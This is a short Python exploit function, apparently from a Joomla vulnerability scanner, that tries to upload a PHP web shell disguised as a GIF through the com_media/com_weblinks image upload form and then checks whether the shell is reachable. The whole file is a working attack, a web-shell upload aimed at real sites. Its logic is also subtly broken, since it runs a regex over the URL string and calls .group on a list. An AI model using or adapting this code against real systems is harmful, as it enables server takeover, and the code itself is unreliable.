import os
import re
import requests

def comweblinks(url,headers):
    s = requests.session()
    endpoint = url + "/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author="
    token = re.findall(re.compile(r'<form action=\"(.*?)" id="uploadForm\"'),endpoint)
    if token:
        url = token.group(1)
    img = open('shell/VulnX.php', 'rb')
    name_img= os.path.basename('shell/VulnX.gif')
    fieldname = "image[]"
    files= {'image': (name_img,img,'form-data',{'Expires': '0'})}
    data = { fieldname : files }
    upload_file = s.post(endpoint,data)
    shellup = url + "/images/VulnX.gif"
    checkShell = requests.get(shellup)
    if checkShell.status_code == 200:
        print('[+] comweblinks ', shellup)
    else:
        print('[-] comweblinks ')